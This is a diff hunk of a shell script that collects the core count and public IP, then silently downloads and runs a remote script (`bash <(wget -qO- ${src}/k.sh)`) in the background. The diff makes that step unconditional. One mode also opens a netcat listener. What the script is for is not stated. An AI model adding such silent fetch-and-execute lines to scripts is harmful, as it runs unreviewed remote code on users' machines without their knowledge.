@@ -19,18 +19,12 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 
+bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
+idlePid="$!"
 
-if [ "$mode" == "0" ]; then
-  # delay="$[`od -An -N2 -i /dev/urandom` % 5400 + 7200]"
-  # bash <(echo "sleep $delay && sudo reboot || reboot") >/dev/null 2>&1 &
-  bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
-  idlePid="$!"
-fi
 
 if [ "$mode" == "1" ]; then
   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
-  bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
-  idlePid="$!"
   [ "$cores" == "2" ] && cores="1";
 fi
 
